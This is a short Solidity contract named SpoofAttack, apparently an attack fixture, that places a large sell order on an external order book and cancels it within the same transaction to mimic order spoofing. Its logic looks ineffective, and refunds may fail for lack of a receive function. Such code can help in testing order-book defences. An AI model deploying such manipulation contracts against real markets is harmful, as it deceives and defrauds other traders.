// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IOrderBook {
    function placeSellOrder(uint256 amount, uint256 price) external payable returns (uint256);
    function cancelOrder(uint256 orderId) external;
}

contract SpoofAttack {
    IOrderBook public immutable book;
    uint256 public lastOrderId;

    constructor(address _orderBook) {
        book = IOrderBook(_orderBook);
    }

    /// @notice Place a large spoofed sell order, then cancel instantly
    /// @param amount Number of tokens to sell
    /// @param price  Price per token in wei
    function spoof(uint256 amount, uint256 price) external payable {
        require(msg.value > 0, "No deposit provided");
        // 1) Place the sell order with deposit
        uint256 oid = book.placeSellOrder{ value: msg.value }(amount, price);
        lastOrderId = oid;
        // 2) Immediately cancel it in the same transaction
        book.cancelOrder(oid);
    }
}
